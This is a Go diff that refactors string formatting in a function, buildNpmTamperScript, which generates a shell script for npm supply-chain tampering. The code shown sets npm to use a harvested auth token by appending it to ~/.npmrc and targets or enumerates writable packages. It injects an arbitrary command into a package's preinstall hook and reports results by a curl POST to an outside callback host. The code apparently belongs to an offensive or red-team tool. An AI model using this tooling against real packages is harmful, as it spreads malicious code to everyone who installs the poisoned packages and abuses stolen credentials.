@@ -98,15 +98,15 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 
 	// Step 2: Configure npm
 	b.WriteString("  # Step 2: Configure npm with harvested token\n")
-	b.WriteString(fmt.Sprintf("  npm config set registry \"%s\"\n", registry))
-	b.WriteString(fmt.Sprintf("  echo \"//%s/:_authToken=${_npm_token}\" >> \"$HOME/.npmrc\"\n",
-		strings.TrimPrefix(strings.TrimPrefix(registry, "https://"), "http://")))
+	fmt.Fprintf(&b, "  npm config set registry \"%s\"\n", registry)
+	fmt.Fprintf(&b, "  echo \"//%s/:_authToken=${_npm_token}\" >> \"$HOME/.npmrc\"\n",
+		strings.TrimPrefix(strings.TrimPrefix(registry, "https://"), "http://"))
 	b.WriteString("  echo \"[+] npm configured with token\"\n\n")
 
 	// Step 3: Discover writable packages
 	if strings.TrimSpace(o.PackageName) != "" {
-		b.WriteString(fmt.Sprintf("  # Step 3: Target specific package: %s\n", o.PackageName))
-		b.WriteString(fmt.Sprintf("  _target_pkg=\"%s\"\n\n", o.PackageName))
+		fmt.Fprintf(&b, "  # Step 3: Target specific package: %s\n", o.PackageName)
+		fmt.Fprintf(&b, "  _target_pkg=\"%s\"\n\n", o.PackageName)
 	} else {
 		b.WriteString("  # Step 3: Discover writable packages\n")
 		b.WriteString("  echo \"[*] Enumerating writable packages...\"\n")
@@ -143,7 +143,7 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 	b.WriteString("    return 1\n")
 	b.WriteString("  fi\n\n")
 	b.WriteString("  echo \"[*] Injecting preinstall hook...\"\n")
-	b.WriteString(fmt.Sprintf("  _inject_cmd='%s'\n", injected))
+	fmt.Fprintf(&b, "  _inject_cmd='%s'\n", injected)
 	b.WriteString("  if command -v python3 >/dev/null 2>&1; then\n")
 	b.WriteString("    python3 -c \"\nimport json, sys\nwith open('$_pkg_dir/package.json') as f:\n    pkg = json.load(f)\npkg.setdefault('scripts', {})['preinstall'] = '$_inject_cmd'\nwith open('$_pkg_dir/package.json', 'w') as f:\n    json.dump(pkg, f, indent=2)\n\" 2>/dev/null\n")
 	b.WriteString("  else\n")
@@ -166,9 +166,9 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 	// Step 7: Report
 	if callback != "" {
 		b.WriteString("  # Step 7: Report results\n")
-		b.WriteString(fmt.Sprintf("  curl -sS -X POST -H \"Content-Type: application/json\" \\\n"))
-		b.WriteString(fmt.Sprintf("    -d '{\"action\":\"npm_tamper\",\"package\":\"'\"$_target_pkg\"'\",\"status\":\"'\"$_pub_rc\"'\"}' \\\n"))
-		b.WriteString(fmt.Sprintf("    \"%s\" >/dev/null 2>&1 || true\n\n", callback))
+		b.WriteString("  curl -sS -X POST -H \"Content-Type: application/json\" \\\n")
+		b.WriteString("    -d '{\"action\":\"npm_tamper\",\"package\":\"'\"$_target_pkg\"'\",\"status\":\"'\"$_pub_rc\"'\"}' \\\n")
+		fmt.Fprintf(&b, "    \"%s\" >/dev/null 2>&1 || true\n\n", callback)
 	}
 
 	b.WriteString("  # Cleanup\n")
